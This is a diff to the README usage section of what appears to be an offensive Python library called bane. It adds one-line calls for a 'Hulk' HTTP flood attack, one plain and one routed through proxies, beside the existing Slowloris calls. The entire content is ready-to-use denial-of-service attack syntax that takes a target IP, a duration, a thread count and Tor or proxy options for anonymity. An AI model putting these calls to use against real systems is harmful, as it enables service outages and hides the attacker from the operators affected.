@@ -141,3 +141,7 @@ II-Usage:
 <br>bane.slowloris(IP, p= port , duration= 300 , set_tor=False , threads=50 , timeout=5 )
 <h4>Slowloris attack through proxies:</h4>
 <br>bane.prox_slowloris(IP, p= port , duration= 300 , threads=500 , timeout=5 )
+<h4>Hulk attack:</h4>
+<br>bane.hulk(IP , duration= 300 , set_tor=False , threads=50 , timeout=5 )
+<h4>Hulk attack through proxies:</h4>
+<br>bane.prox_hulk(IP , duration= 300 , set_tor=False , threads=50 , timeout=5 )
